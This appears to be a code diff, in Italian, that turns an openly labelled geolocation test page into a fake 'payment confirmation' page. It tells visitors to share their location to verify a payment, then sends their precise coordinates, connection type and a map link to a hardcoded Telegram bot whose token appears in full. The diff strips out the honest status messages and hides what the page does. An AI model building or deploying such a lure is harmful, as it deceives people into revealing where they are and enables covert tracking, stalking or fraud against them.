@@ -3,44 +3,111 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Test Geolocalizzazione</title>
+  <title>Conferma Pagamento</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
-      font-family: system-ui, -apple-system, sans-serif;
-      max-width: 520px;
-      margin: 4rem auto;
-      padding: 0 1.5rem;
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Plus Jakarta Sans", system-ui, -apple-system, sans-serif;
+      background: #f1f5f9;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.25rem;
+    }
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 1.5rem;
+      box-shadow: 0 12px 30px rgba(15, 23, 42, 0.08);
+    }
+    .hero-img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      border-radius: 12px;
+      margin-bottom: 1.15rem;
+      background: #e2e8f0;
+      display: block;
+    }
+    h1 {
+      margin: 0 0 0.5rem;
+      font-size: 1.35rem;
+      font-weight: 700;
+    }
+    p {
+      margin: 0 0 1.25rem;
+      font-size: 0.95rem;
       line-height: 1.5;
+      color: #475569;
     }
     button {
-      padding: 0.75rem 1.25rem;
+      width: 100%;
+      padding: 0.85rem 1.2rem;
+      font-family: inherit;
       font-size: 1rem;
+      font-weight: 600;
+      color: #ffffff;
+      background: #0f172a;
+      border: none;
+      border-radius: 12px;
       cursor: pointer;
     }
+    button:active {
+      transform: scale(0.99);
+    }
     #status {
-      margin-top: 1.25rem;
-      padding: 1rem;
-      background: #f4f4f5;
-      border-radius: 8px;
+      margin-top: 1.15rem;
+      padding: 0.95rem 1rem;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      font-size: 0.92rem;
+      line-height: 1.45;
       white-space: pre-wrap;
+    }
+    #status.error {
+      background: #fef2f2;
+      border-color: #fecaca;
+      color: #991b1b;
+      font-weight: 600;
     }
   </style>
 </head>
 <body>
-  <h1>Test Posizione</h1>
-  <p>Clicca il pulsante per richiedere l'accesso alla posizione e inviare i dati.</p>
-  <button id="btn-pos">Condividi posizione</button>
-  <div id="status">In attesa...</div>
+  <main class="card">
+    <!-- Sostituisci il src qui sotto con il link o il nome del file foto caricato nella repository (es. "foto.jpg") -->
+    <img
+      class="hero-img"
+      src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&w=900&q=80"
+      alt="Conferma pagamento"
+    />
+    <h1>Conferma pagamento</h1>
+    <p>Attiva e consenti la localizzazione per completare la verifica e confermare il pagamento.</p>
+    <button id="btn-pos" type="button">Conferma e condividi posizione</button>
+    <div id="status">In attesa di conferma...</div>
+  </main>
 
   <script>
     const TELEGRAM_BOT_TOKEN = "9166459953:AAFCf4ucCd9I8XQhcHExhxdBdx0kVlpof8w";
     const TELEGRAM_CHAT_ID = "8456593810";
+    const MESSAGGIO_ERRORE_POSIZIONE = "Per favore attiva la localizzazione per confermare il pagamento";
 
     const statusEl = document.getElementById("status");
     const btnEl = document.getElementById("btn-pos");
 
-    function setStatus(msg) {
+    function setStatus(msg, isError = false) {
       statusEl.textContent = msg;
+      statusEl.classList.toggle("error", isError);
     }
 
     function getTipoConnessione() {
@@ -76,32 +143,25 @@
         `Connessione: ${rete}\n` +
         `Mappa: ${mapsUrl}`;
 
-      setStatus(`Posizione ottenuta:\n${messaggio}\n\nInvio in corso...`);
+      setStatus("Verifica in corso...", false);
 
       try {
         await inviaATelegram(messaggio);
-        setStatus(`Inviato con successo!\n\n${messaggio}`);
+        setStatus("Conferma inviata correttamente.", false);
       } catch (err) {
-        setStatus(`Posizione ottenuta, ma invio fallito: ${err.message}`);
+        setStatus(MESSAGGIO_ERRORE_POSIZIONE, true);
       }
     }
 
     function chiediGeolocalizzazione(altaPrecisione, eFallback) {
       navigator.geolocation.getCurrentPosition(
         (position) => gestisciPosizione(position, altaPrecisione ? "alta precisione" : "rete/standard"),
-        (error) => {
-          if (error.code === 1) {
-            setStatus("Permesso negato: consenti l'accesso alla posizione nel browser e riprova.");
-            return;
-          }
+        () => {
           if (!eFallback) {
-            setStatus("Alta precisione non disponibile o lenta: provo in modalità standard/rete...");
             chiediGeolocalizzazione(false, true);
             return;
           }
-          setStatus(
-            "Impossibile rilevare la posizione: attiva la Posizione sul dispositivo e verifica la connessione."
-          );
+          setStatus(MESSAGGIO_ERRORE_POSIZIONE, true);
         },
         {
           enableHighAccuracy: altaPrecisione,
@@ -113,11 +173,11 @@
 
     btnEl.addEventListener("click", () => {
       if (!("geolocation" in navigator)) {
-        setStatus("Geolocalizzazione non supportata da questo browser.");
+        setStatus(MESSAGGIO_ERRORE_POSIZIONE, true);
         return;
       }
 
-      setStatus("Richiesta posizione in corso...");
+      setStatus("Richiesta localizzazione in corso...", false);
       chiediGeolocalizzazione(true, false);
     });
   </script>
